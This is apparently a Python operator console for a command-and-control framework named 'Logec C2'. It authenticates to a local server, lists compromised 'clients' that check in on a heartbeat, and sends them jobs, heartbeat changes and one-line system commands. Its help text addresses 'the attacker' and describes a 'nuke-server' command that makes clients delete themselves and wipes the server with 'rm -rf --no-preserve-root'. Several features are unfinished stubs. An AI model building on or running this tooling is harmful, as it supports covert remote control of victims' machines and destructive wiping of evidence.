import socket
import os

global_debug = False


class fclient():

    def __init__(self):
        self.encoding = 'utf-8'
        
    
    def connect_to_server(self):
        print('Connecting to server') if global_debug else None
        
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        
        self.ip, self.port = "127.0.0.1", 100
        
        self.server_addr = (self.ip, self.port)
        self.server.connect(self.server_addr)
        
        creds = self.credential_gather()
        
        print(f"!_user_!\\|/{creds[0]}\\|/{creds[1]}") if global_debug else None
        
        self.server.send(self.str_encode(f"!_userlogin_!\\|/{creds[0]}//|\\\\{creds[1]}"))
        response = int(self.server.recv(1024).decode())

        print(f"Server Auth Response: {response}")
        
        ## 0 is success, like in C
        if response == 0:
            print("Connected!\n")
            while True:
                self.server_interact()
        else:
            print("Auth failed.")
            self.connect_to_server()


################
## Server interact
################  

    ##directly interacting with the server
    def server_interact(self):
        ## Populating the lists needed & getting info from server
        self.server_info_fetch()
        ## This will be returned to the client later
        
        ## dict - can't do .lower() due to client names being capataliezed. fuck
        client_name = input("Enter a client name to interact, 'help', or 'refresh': ")#.lower()

        ################
        ## Home Menu
        ################ 

        #request a manual client update
        if client_name.lower() == "clients":
            self.server_request("clients")
            self.shellformat("")
        
        
        elif client_name.lower() == "refresh":
            if os.name == "nt":
                os.system("cls")

            else:
                os.system("clear")
            self.server_info_fetch()
            
            self.shellformat("")
            
        elif client_name.lower() == "get-jobs":
            server_supported_jobs = (
                "Possible Jobs (Some may not be available on older clients):\n" \
                "set-heartbeat\n" \
                "wait\n" \
                "run-command\n" \
            )
            
            #return self.server_request(f"get-jobs", client_name)
            self.shellformat(server_supported_jobs)
            
        elif client_name.lower() == "help":
            helpmenu = (
            "Home: \n" \
            "refresh - refreshes the current connected clients \n" \
            "stats - ' [BETA] Prints all clients stats'\n" \
            )
            ## change these to enter
            #input("Type Home for Home: ")
            #self.server_interact()
            
            self.shellformat(helpmenu)


        ## !!!!!!!!!
        ## Up next, getting individual clients to work
        ## 1111111
        elif client_name in self.clients:
            while True:
                ## 'response =' instead of a direct print so I can pass the variable easier/shorter
                response = self.client_interact_through_server(input(f"{client_name}@127.0.0.1:6969$: "), client_name)
                print(response)
                
            #print("Valid Client. Control not implemented")
            #print("DEBUG: client is in the client list!") if global_debug else None
            #pass
            ## send instance/client name
            ## server set instance to be that instance. (might be tough/run into threading issues)
            ## run command on that instance


            #user_input_for_client = input(f"Client (jobs for options): [{self.ip_address}]: ")
            #print(client_interact_through_server(user_input_for_client))
            
            
        # get the corresponding instance from the clients dictionary and call its method
        
        ## Part of this needs to stay here, the other part needs to go back to the server
        else:
            print("command not found")
            print(self.clients)
            print(client_name)
        

    def shellformat(self, results):
        if os.name == "nt":
            os.system("cls")

        else:
            os.system("clear")
        
        print(" ===== Logec C2 Manual Shell +++++\n\n")
        
        print("\n\n========Current Clients (num)============"[:35])
        #self.server_request("clients")
        print(self.clients)
        
        print("=================================")
        print("!! Clients populate on heartbeat, be patient\n\n")   
        
        print(results)
        

################
## Client Interact
################  

    ## Interacting with clients via the server as a middle man
    ## Meant to be called per message
    ## -> will always return the server response 
    
    def client_interact_through_server(self, client_command, client_name):            
        if client_command == "" or client_command == "help":
            print(
                f"Prefix Overview: \n  - 'get': retrieves data from the server.\n  - 'set': set something on the client, or server\n  - 'run': run an action on the client, or the server\n\n" \
                
                
                f"Commands: \n"
                f"get-data: retrives general data about the client from the server's inventory (does not touch client)\n" \
                f"get-jobs: Lists all the jobs the *server* knows about. Not all jobs may be supported accross all clients. (see get-jobs-possible command)" 
                f"get-jobs-possible retrieves the jobs the client can *currently* do. (DOES talk to client)"
                
                f"set-job: Sets a job for the current client. Jobs are a set of actions run by the client\n" \
                f"run-command: runs a singular (one liner) system command on the client. Handy for if there is not a job that runs what you need.\n" \
                    
                f"Emergency Comands: \n  - use for EMERGENCIES ONLY, there is no favorable outcome for the attacker with these" \
                f"nuke-server: Kills the server, tells the clients to delete themselves, and runs 'rm-rf --no-preserve-root' the server machine. "
            )
        
        elif client_command == "get-data":
            return self.server_request(f"get-data", client_name)

        #elif client_command == "set-heartbeat":
        
        ## done like this so a value can be put in
        ## !!!! Do all of them like this, with proper error checking as well
        elif "set-heartbeat" in client_command:
            try:
                ## map: stripping of whitespace and splitting
                command, value = map(str.strip, client_command.split())
                value = int(value)
            except ValueError:
                print("Please provide a valid integer for the heartbeat timeout:\nset-heartbeat 120")
            else:
                return self.server_request(f"{client_command}", client_name)

        elif client_command == "set-job":
            return self.server_request(f"set-job", client_name)
        
        elif client_command == "run-command":
            return self.server_request(f"run-command", client_name)


        else:
            print("command not found")
            #print(f"{client_name} not found.")
            #os.system("clear")
            #self.client_interact_through_server()

            
################
## Server Functions
################  
    ## grabs info and foramts it, meant to be an easy data-update method
    def server_info_fetch(self):
        print("Requesting self.clients...")
        self.clients = list(self.server_request("clients").split())
        #self.client_stats = self.server_request("stats")
    
    ## Grabs (per) client info and formats it
    '''def client_info_fetch(self, client_name):
        print("Requesting {client_name} info...")
        self.client_info = list(self.server_request("clients").split())
        #self.client_stats = self.server_request("stats")'''
        
        
    ## THe main interface for gettin data from the server
    ## will handle all encoding & bs, just pass it the string
    ## -> returns the response!
    
    def server_request(self, request, client_name=None):
    
        if request == "clients":
            formatted_request = f"!_usercommand_!\\|/{self.username}//|\\\\{request}"
            
            print(f"DEBUG: Sending {formatted_request}") if global_debug else None
            self.server.send(self.str_encode(formatted_request))

            ## return this eventually to the function that called it to print
            print("DEBUG: waiting on response...") if global_debug else None
            
            serv_response = self.str_decode(self.server.recv(1024))
            print(f"DEBUG: Serv Response: {serv_response}") if global_debug else None
            return serv_response
        
        elif "-" in request:
            formatted_request = f"!_usercommand_!\\|/{self.username}//|\\\\{request} {client_name}"
            print(f"Formatted request: {formatted_request}")
            self.server.send(self.str_encode(formatted_request))
            
            serv_response = self.str_decode(self.server.recv(1024))
            print(f"DEBUG: Serv Response: {serv_response}") if global_debug else None
            return serv_response
            
        else:
            print(f"Invalid Command: {request}")

    ## takes creds from friendly client
    def credential_gather(self) -> list:
        ## HA yes this works! init the list with types!
        creds_list = [str, str]
        
        creds_list[0] = input("Username: ")
        creds_list[1] = input("Password: ")

        self.username = creds_list[0]
    
        return creds_list
        
    ## Doing dedicated encode/decode casuse syntax is easier & cleaner
    ## bytes -> str
    def str_decode(self, input) -> str:
        decoded_result = input.decode()
        return decoded_result

    ## str -> bytes
    def str_encode(self, input) -> bytes:
        encoded_result = input.encode()
        return encoded_result


if __name__ == "__main__":
    fc = fclient()
    
    fc.connect_to_server()